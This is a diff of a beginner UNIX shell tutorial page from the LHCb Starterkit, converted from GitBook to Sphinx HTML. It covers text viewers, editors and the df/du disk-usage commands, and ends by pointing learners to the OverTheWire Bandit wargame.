-<h2 id="text-viewers">Text viewers</h2>
-<p>The <code>less</code> command, which is the improved version of an earlier program, called <code>more</code>, is used to read but not edit text files.
+</pre></div>
+</div>
+<p>Great!</p>
+</div>
+<div class="section" id="complexity">
+<h2>Complexity<a class="headerlink" href="#complexity" title="Permalink to this headline">¶</a></h2>
+<p>Bash is great until a certain level of complexity is reached…so try to keep it simple!
+What about <a class="reference external" href="http://lhcb-release-area.web.cern.ch/LHCb-release-area/DOC/online/releases/v4r65/doxygen/df/dd9/src_2_lineshape_maker_8cpp__incl.png">this</a>?</p>
+</div>
+<div class="section" id="text-viewers">
+<h2>Text viewers<a class="headerlink" href="#text-viewers" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">less</span></code> command, which is the improved version of an earlier program, called <code class="docutils literal notranslate"><span class="pre">more</span></code>, is used to read but not edit text files.
 It allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.
-Up and down arrows (or <code>j</code> and <code>k</code>) allow to scroll through the text file, line by line, while <code>Ctrl+f</code> and <code>Ctrl+b</code> allow to scroll through the text file, page by page.
-To go to a specific line, it is possible to type the number of the line and then press <code>G</code>.
-To search for a string forward, press <code>/</code> and then type the string.
-To search for a string backward, press <code>?</code> and then type the string.
-To quit, press <code>q</code>.</p>
-<p>The <code>cat</code> command is even simpler than <code>less</code>, since it just outputs the contents of one or more files to the standard output.</p>
-<pre><code>cat file.dat
+Up and down arrows (or <code class="docutils literal notranslate"><span class="pre">j</span></code> and <code class="docutils literal notranslate"><span class="pre">k</span></code>) allow to scroll through the text file, line by line, while <code class="docutils literal notranslate"><span class="pre">Ctrl+f</span></code> and <code class="docutils literal notranslate"><span class="pre">Ctrl+b</span></code> allow to scroll through the text file, page by page.
+To go to a specific line, it is possible to type the number of the line and then press <code class="docutils literal notranslate"><span class="pre">G</span></code>.
+To search for a string forward, press <code class="docutils literal notranslate"><span class="pre">/</span></code> and then type the string.
+To search for a string backward, press <code class="docutils literal notranslate"><span class="pre">?</span></code> and then type the string.
+To quit, press <code class="docutils literal notranslate"><span class="pre">q</span></code>.</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">cat</span></code> command is even simpler than <code class="docutils literal notranslate"><span class="pre">less</span></code>, since it just outputs the contents of one or more files to the standard output.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>cat file.dat
 cat file1.dat file2.dat
-</code></pre><p>But it is very powerful when linking commands!</p>
-<p>Finally, the <code>head</code>/<code>tail</code> commands print the first(last) n lines of a given file:</p>
-<pre><code>head -n 2 file.dat
+</pre></div>
+</div>
+<p>But it is very powerful when linking commands!</p>
+<p>Finally, the <code class="docutils literal notranslate"><span class="pre">head</span></code>/<code class="docutils literal notranslate"><span class="pre">tail</span></code> commands print the first(last) n lines of a given file:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>head -n 2 file.dat
 head -n 2 file1.dat file2.dat
-</code></pre><h2 id="text-editors">Text editors</h2>
+</pre></div>
+</div>
+</div>
+<div class="section" id="text-editors">
+<h2>Text editors<a class="headerlink" href="#text-editors" title="Permalink to this headline">¶</a></h2>
 <p>Text editors allow not only to read, but also to modify the contents of a text file.
 There are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:</p>
-<ul>
-<li><code>vim</code> or simply <code>vi</code></li>
-<li><code>emacs</code></li>
-<li><code>nano</code></li>
-<li><code>gedit</code></li>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">vim</span></code> or simply <code class="docutils literal notranslate"><span class="pre">vi</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">emacs</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">nano</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">gedit</span></code></p></li>
 </ul>
-<h2 id="disk-space">Disk space</h2>
+</div>
+<div class="section" id="disk-space">
+<h2>Disk space<a class="headerlink" href="#disk-space" title="Permalink to this headline">¶</a></h2>
 <p>At some point we all need to check how much space we are using.
-For doing that, we can use the <code>df</code> and <code>du</code> commands.
-The <code>df</code> command displays the disk usage and remaining free space on all currently mounted devices:</p>
-<pre><code>df
-</code></pre><p>We can specify the option <code>-h</code> to convert to human readable units (kB, MB, GB, &#x2026;):</p>
-<pre><code>df -h
-</code></pre><p>and a directory, if we want to inspect only that:</p>
-<pre><code>df -h directory
-</code></pre><p>The <code>du</code> command is similar to <code>df</code>, but goes recursively in all subdirectories of the present working directory:</p>
-<pre><code>du
-</code></pre><p>If the option <code>-s</code> is specified,</p>
-<pre><code>du -s
-</code></pre><p>it checks the present working directory only. As for <code>df</code>, the <code>-h</code> option allows to have human readable units.
+For doing that, we can use the <code class="docutils literal notranslate"><span class="pre">df</span></code> and <code class="docutils literal notranslate"><span class="pre">du</span></code> commands.
+The <code class="docutils literal notranslate"><span class="pre">df</span></code> command displays the disk usage and remaining free space on all currently mounted devices:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>df
+</pre></div>
+</div>
+<p>We can specify the option <code class="docutils literal notranslate"><span class="pre">-h</span></code> to convert to human readable units (kB, MB, GB, …):</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>df -h
+</pre></div>
+</div>
+<p>and a directory, if we want to inspect only that:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>df -h directory
+</pre></div>
+</div>
+<p>The <code class="docutils literal notranslate"><span class="pre">du</span></code> command is similar to <code class="docutils literal notranslate"><span class="pre">df</span></code>, but goes recursively in all subdirectories of the present working directory:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>du
+</pre></div>
+</div>
+<p>If the option <code class="docutils literal notranslate"><span class="pre">-s</span></code> is specified,</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>du -s
+</pre></div>
+</div>
+<p>it checks the present working directory only. As for <code class="docutils literal notranslate"><span class="pre">df</span></code>, the <code class="docutils literal notranslate"><span class="pre">-h</span></code> option allows to have human readable units.
 Another interesting option is</p>
-<pre><code>du &#x2014;max-depth=N
-</code></pre><p>which allows to go <code>N</code> directories deep.</p>
-<h2 id="over-the-wire-and-bandit-wargame">Over the Wire and Bandit wargame</h2>
-<p>And to conclude...let&apos;s start a 20 min wargame on <a href="http://overthewire.org/wargames/bandit/" target="_blank">Over the Wire</a> and compete to earn a delicious cold beer to be served soon after the session itself!</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>du —max-depth=N
+</pre></div>
+</div>
+<p>which allows to go <code class="docutils literal notranslate"><span class="pre">N</span></code> directories deep.</p>
+</div>
+<div class="section" id="over-the-wire-and-bandit-wargame">
+<h2>Over the Wire and Bandit wargame<a class="headerlink" href="#over-the-wire-and-bandit-wargame" title="Permalink to this headline">¶</a></h2>
+<p>And to conclude…let’s start a 20 min wargame on <a class="reference external" href="http://overthewire.org/wargames/bandit/">Over the Wire</a> and compete to earn a delicious cold beer to be served soon after the session itself!</p>
 <p>Bandit is a wargame aimed at absolute beginners.
-It is organised in levels, each level requiring to having completed the previous one. Don&#x2019;t panic if you have no clue how to proceed:</p>
-<pre><code>- try using the manual, by typing man &lt;command&gt; (even man has a man) and then type q to quit the manual pages;
-- for shell built-in commands, try with help &lt;command&gt;;
-- ask Google or your favourite search engine!
-</code></pre>
-                                
-                                </section>
-                            
-    </div>
-    <div class="search-results">
-        <div class="has-results">
-            
-            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
-            <ul class="search-results-list"></ul>
-            
-        </div>
-        <div class="no-results">
-            
-            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
-            
-        </div>
-    </div>
+It is organised in levels, each level requiring to having completed the previous one. Don’t panic if you have no clue how to proceed:
+- try using the manual, by typing man <command> (even man has a man) and then type q to quit the manual pages;
+- for shell built-in commands, try with help <command>;
+- ask Google or your favourite search engine!</p>
+</div>
 </div>
 
-                        </div>
-                    </div>
-                
-            </div>
 
-            
-                
-                <a href="persistent-screen.html" class="navigation navigation-prev " aria-label="Previous page: Persistent screen or tmux session">
-                    <i class="fa fa-angle-left"></i>
-                </a>
-                
-                
-                <a href="../git/" class="navigation navigation-next " aria-label="Next page: Version control with Git">
-                    <i class="fa fa-angle-right"></i>
-                </a>
-                
-            
-        
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../git/README.html" class="btn btn-neutral float-right" title="Git" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="persistent-screen.html" class="btn btn-neutral float-left" title="Persistent screen or tmux session on lxplus" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
     </div>
+  
 
-    <script>
-        var gitbook = gitbook || [];
-        gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Advanced shell topics","level":"4.1.4","depth":2,"next":{"title":"Version control with Git","level":"5.1","depth":1,"path":"git/README.md","ref":"git/README.md","articles":[{"title":"Basics","level":"5.1.1","depth":2,"path":"git/01-basics.md","ref":"git/01-basics.md","articles":[]},{"title":"Setting Up Git","level":"5.1.2","depth":2,"path":"git/02-setup.md","ref":"git/02-setup.md","articles":[]},{"title":"Creating a Repository","level":"5.1.3","depth":2,"path":"git/03-create.md","ref":"git/03-create.md","articles":[]},{"title":"Tracking Changes","level":"5.1.4","depth":2,"path":"git/04-changes.md","ref":"git/04-changes.md","articles":[]},{"title":"Exploring History","level":"5.1.5","depth":2,"path":"git/05-history.md","ref":"git/05-history.md","articles":[]},{"title":"Ignoring Things","level":"5.1.6","depth":2,"path":"git/06-ignore.md","ref":"git/06-ignore.md","articles":[]},{"title":"Remotes in CERN GitLab","level":"5.1.7","depth":2,"path":"git/07-gitlab.md","ref":"git/07-gitlab.md","articles":[]},{"title":"Sharing a repository with others","level":"5.1.8","depth":2,"path":"git/08-share.md","ref":"git/08-share.md","articles":[]},{"title":"Collaborating with Pull Requests","level":"5.1.9","depth":2,"path":"git/09-pullrequests.md","ref":"git/09-pullrequests.md","articles":[]},{"title":"Conflicts","level":"5.1.10","depth":2,"path":"git/10-conflict.md","ref":"git/10-conflict.md","articles":[]},{"title":"GitLab CI","level":"5.1.11","depth":2,"path":"git/11-ci.md","ref":"git/11-ci.md","articles":[]},{"title":"Open Science","level":"5.1.12","depth":2,"path":"git/12-open.md","ref":"git/12-open.md","articles":[]},{"title":"Licensing","level":"5.1.13","depth":2,"path":"git/13-licensing.md","ref":"git/13-licensing.md","articles":[]},{"title":"Citation","level":"5.1.14","depth":2,"path":"git/14-citation.md","ref":"git/14-citation.md","articles":[]}]},"previous":{"title":"Persistent screen or tmux session","level":"4.1.3","depth":2,"path":"shell-extras/persistent-screen.md","ref":"shell-extras/persistent-screen.md","articles":[]},"dir":"ltr"},"config":{"plugins":["katex","panels@git+https://github.com/lhcb/gitbook-plugin-panels.git#master","collapsible-menu","block-align","otherlink"],"styles":{"website":"css/website.css"},"pluginsConfig":{"collapsible-menu":{},"block-align":{},"search":{},"otherlink":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"panels":{},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"LHCb analysis essentials","gitbook":"*","description":"Material for the first half of the LHCb Starterkit. Covers the basics of Git, Python, and the UNIX shell."},"file":{"path":"shell-extras/shell2.md","mtime":"2018-11-26T12:26:23.705Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2018-11-26T12:29:31.553Z"},"basePath":"..","book":{"language":""}});
-        });
-    </script>
-</div>
+  <hr/>
 
-        
-    <script src="../gitbook/gitbook.js"></script>
-    <script src="../gitbook/theme.js"></script>
-    
-        
-        <script src="../gitbook/gitbook-plugin-panels/panels.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-collapsible-menu/plugin.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-otherlink/js/otherlink.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
-        
-    
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright HSF [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/legalcode) - Originally based on [swcarpentry](https://github.com/swcarpentry/) © 2016–2017 Software Carpentry Foundation
 
-    </body>
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+  
+    Hello world
+
+
+</body>
 </html>
-
